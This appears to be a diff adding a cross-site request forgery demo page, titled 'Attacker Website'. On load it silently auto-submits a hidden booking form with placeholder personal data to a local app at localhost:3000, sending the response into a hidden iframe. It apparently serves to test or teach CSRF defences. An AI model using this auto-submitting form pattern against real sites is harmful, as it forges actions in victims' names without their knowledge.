@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Attacker Website</title>
+</head>
+<body onload="document.forms[0].submit()">
+  <h1>This Website is dangerous</h1>
+
+  <form target="submitFrame" action="http://localhost:3000/booking" method="POST">
+    <input type="hidden" name="salutation" value="Herr">
+    <input type="hidden" name="firstName" value="Max">
+    <input type="hidden" name="name" value="Mustermann">
+    <input type="hidden" name="street" value="Musterstraße">
+    <input type="hidden" name="houseNumber" value="1">
+    <input type="hidden" name="postalCode" value="12345">
+    <input type="hidden" name="city" value="Musterdorf">
+    <input type="hidden" name="email" value="max.mustermann@test.de">
+    <input type="hidden" name="telephone" value="1234567890">
+    <input type="hidden" name="amount" value="1">
+    <input type="hidden" name="event_id" value="1234abcd">
+  </form>
+
+  <iframe style="display: none" name="submitFrame" id="submitFrame"></iframe>
+</body>
+</html>
